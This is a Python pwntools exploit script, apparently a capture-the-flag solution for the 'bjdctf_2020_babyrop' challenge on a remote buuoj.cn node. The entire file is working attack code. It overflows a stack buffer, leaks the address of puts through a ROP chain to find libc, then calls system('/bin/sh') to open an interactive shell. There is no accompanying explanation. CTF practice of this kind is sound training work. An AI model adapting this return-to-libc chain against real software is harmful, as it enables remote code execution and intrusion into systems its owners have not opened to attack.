from pwn import *


r = remote('node5.buuoj.cn', 25200)
elf = ELF(r'../bjdctf_2020_babyrop')
libc = ELF(r'../lib/libc6_2.23-0ubuntu11_amd64.so')

context.log_level = 'debug'

main_addr = elf.sym['main']
puts_got = elf.got['puts']
put_plt = elf.plt['puts']

print(hex(main_addr))
print(hex(put_plt))
print(hex(puts_got))

pop_rdi = 0x400733
ret_addr = 0x4004c9

payload = b'A' * (0x20 + 8) + p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(main_addr)

r.sendlineafter('Pull up your sword and tell me u story!\n', payload)
puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))  # 0x7f0cb7e36690
print(hex(puts_addr))

puts_offset = libc.sym['puts']
system_offset = libc.sym['system']
bash_offset = libc.search(b'/bin/sh').__next__()

base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset
bash_addr = base_addr + bash_offset

print(hex(system_addr))  # 0x7fc19b26e390
print(hex(bash_addr))  # 0x7fc19b3b5d57

payload2 = b'A' * (0x20 + 8) + p64(ret_addr) + p64(pop_rdi) + p64(bash_addr) + p64(system_addr)
r.sendlineafter('Pull up your sword and tell me u story!\n', payload2)
r.interactive()
